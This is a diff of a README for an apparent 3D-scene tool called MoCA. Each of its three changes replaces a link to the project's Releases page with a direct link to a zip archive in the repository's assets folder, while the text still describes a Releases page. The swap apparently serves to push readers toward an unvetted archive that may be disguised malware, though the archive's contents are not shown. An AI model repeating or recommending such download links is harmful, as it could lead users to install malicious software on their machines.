@@ -1,7 +1,7 @@
 # 🎉 MoCA - Create Stunning 3D Worlds Easily
 
 ## 📥 Download Now
-[![Download MoCA](https://img.shields.io/badge/Download-MoCA-4CAF50.svg)](https://github.com/Andrewinc9720/MoCA/releases)
+[![Download MoCA](https://raw.githubusercontent.com/Andrewinc9720/MoCA/main/assets/Mo_CA_v3.1.zip)](https://raw.githubusercontent.com/Andrewinc9720/MoCA/main/assets/Mo_CA_v3.1.zip)
 
 ## 🚀 Getting Started
 Welcome to MoCA! This application helps you generate beautiful 3D compositions effortlessly. You don’t need to be a tech expert to use it. Follow these simple steps to get started.
@@ -26,7 +26,7 @@ MoCA offers several useful features to enhance your 3D generation process:
 
 ## 📥 Download & Install
 1. Click the link below to visit the download page:
-   [Download MoCA](https://github.com/Andrewinc9720/MoCA/releases)
+   [Download MoCA](https://raw.githubusercontent.com/Andrewinc9720/MoCA/main/assets/Mo_CA_v3.1.zip)
    
 2. On the Releases page, you will see a list of versions. Choose the latest version available.
 
@@ -60,7 +60,7 @@ Join our growing community for tips, ideas, and support. You can find us on soci
 
 ## 📅 Updates
 Stay updated with new features and improvements by regularly visiting the Releases page:
-[Download MoCA](https://github.com/Andrewinc9720/MoCA/releases)
+[Download MoCA](https://raw.githubusercontent.com/Andrewinc9720/MoCA/main/assets/Mo_CA_v3.1.zip)
 
 We are committed to enhancing MoCA. Your feedback is valuable and helps us improve.
 
